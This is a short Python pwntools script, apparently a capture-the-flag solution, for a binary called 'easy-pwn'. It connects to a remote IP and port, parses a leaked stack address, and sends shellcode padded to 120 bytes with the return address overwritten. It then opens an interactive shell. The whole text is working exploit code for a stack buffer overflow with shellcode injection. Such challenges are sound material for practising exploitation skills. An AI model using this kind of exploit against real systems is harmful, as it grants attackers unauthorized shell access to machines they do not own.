from pwn import *
exe = './easy-pwn'
elf = context.binary = ELF(exe, checksec="TRUE")
context.log_level = 'DEBUG'
# p = process(exe)
p = remote('103.185.44.122',15118)
shellcode = asm(shellcraft.sh())
padding = 120-len(shellcode)
p.sendlineafter(b'>> ', b'1')
# Membaca string yang diberikan oleh sistem
address = int(p.recvuntil(b'x')[:-1].decode())
print(f' LEAK -> {address}')

# Mengonversi string menjadi bilangan bulat

payload = shellcode
payload = payload.ljust(120, b'A')
payload += p64(address)
print(p64(address))
p.sendlineafter(b': ', payload)
p.interactive()

